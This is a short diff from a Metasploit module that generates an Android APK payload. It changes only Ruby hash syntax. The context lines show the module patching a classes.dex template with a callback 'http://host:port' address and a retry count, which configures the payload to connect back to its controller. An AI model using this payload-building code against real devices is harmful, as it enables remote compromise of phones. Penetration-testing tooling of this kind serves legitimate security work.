@@ -38,7 +38,7 @@ module Metasploit3
 
     jar = Rex::Zip::Jar.new
 
-    classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})
+    classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {mode: 'rb'})
     string_sub(classes, 'ZZZZ                                ', "ZZZZhttp://" + host + ":" + port)
     string_sub(classes, 'TTTT                                ', "TTTT" + datastore['RetryCount'].to_s) if datastore['RetryCount']
     jar.add_file("classes.dex", fix_dex_header(classes))
